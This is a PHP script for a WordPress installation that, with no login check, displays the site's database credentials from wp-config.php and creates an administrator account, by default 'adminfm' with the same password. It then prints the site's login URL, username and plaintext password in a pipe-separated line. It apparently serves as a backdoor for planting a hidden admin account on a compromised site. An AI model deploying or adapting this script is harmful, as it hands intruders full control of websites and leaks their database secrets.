<?php
require_once('wp-config.php');
// Initialize connection variables
$db_host = $db_user = $db_password = $db_name = $db_prefix = '';
$connection = null;

// Handle form submission for user creation
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['create_user'])) {
    $db_host = $_POST['db_host'];
    $db_user = $_POST['db_user'];
    $db_password = $_POST['db_password'];
    $db_name = $_POST['db_name'];
    $db_prefix = $_POST['db_prefix'];

    // Connect to the database
    $connection = new mysqli($db_host, $db_user, $db_password, $db_name);

    // Check connection
    if ($connection->connect_error) {
        die("Connection failed: " . $connection->connect_error);
    }

    // User input for username and password
    $username = $connection->real_escape_string($_POST['username']);
    $password = $_POST['password'];

    // Hash the password
    $hashed_password = password_hash($password, PASSWORD_BCRYPT);
    
    // Generate user ID
    $user_id = time(); // or use an incremental approach

    // Insert the user into the database
    $sql = "INSERT INTO ".$db_prefix."users (ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status) 
            VALUES ('$user_id', '$username', '$hashed_password', '$username', '', '', NOW(), 0)";
    
    if ($connection->query($sql) === TRUE) {
        // Assign admin capabilities
        $sql2 = "INSERT INTO ".$db_prefix."usermeta (user_id, meta_key, meta_value) VALUES ('$user_id', '".$db_prefix."capabilities', 'a:1:{s:13:\"administrator\";b:1;}')";
        $connection->query($sql2);

        $sql3 = "INSERT INTO ".$db_prefix."usermeta (user_id, meta_key, meta_value) VALUES ('$user_id', '".$db_prefix."user_level', '10')";
        $connection->query($sql3);

        echo "New user created successfully with admin rights.<br/>".$_SERVER['SERVER_NAME']."/wp-login.php|".$username."|".$password;
    } else {
        echo "Error: " . $sql . "<br>" . $connection->error;
    }

    $connection->close();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Add Admin User</title>
</head>
<body>
    <h2>Add New Admin User</h2>
    <form method="post" action="">
        <h3>Database Connection Information</h3>
        <label for="db_host">Database Host:</label>
        <input type="text" name="db_host" value="<?php echo DB_HOST; ?>" required><br><br>
        <label for="db_user">Database User:</label>
        <input type="text" name="db_user" value="<?php echo DB_USER;?>" required><br><br>
        <label for="db_password">Database Password:</label>
        <input type="text" name="db_password" value="<?php echo DB_PASSWORD;?>" required><br><br>
        <label for="db_name">Database Name:</label>
        <input type="text" name="db_name" value="<?php echo DB_NAME; ?>" required><br><br>
        <label for="db_prefix">Database Prefix:</label>
        <input type="text" name="db_prefix" value="<?php echo $table_prefix; ?>" required><br><br>
		
        <h3>New User Information</h3>
        <label for="username">Username:</label>
        <input type="text" name="username" value="adminfm" required><br><br>
        <label for="password">Password:</label>
        <input type="password" name="password" value="adminfm" required><br><br>
        
        <input type="submit" name="create_user" value="Add User">
    </form>
</body>
</html>